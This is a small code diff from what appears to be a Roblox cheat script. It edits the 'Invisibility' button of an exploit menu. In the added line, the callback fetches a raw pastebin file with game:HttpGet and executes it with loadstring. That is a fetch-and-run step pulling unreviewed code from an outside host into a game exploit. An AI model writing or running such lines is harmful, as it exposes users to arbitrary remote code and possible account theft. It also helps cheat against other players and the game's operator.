@@ -59,8 +59,8 @@ local Toggle = MainTab:CreateToggle({
 })
 
 local Button = MainTab:CreateButton({
-   Name = "Invisibility (OP)",
+   Name = "Invisibility",
    Callback = function()
-        https://pastebin.com/raw/3Rnd9rHf
+        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
    end,
 })
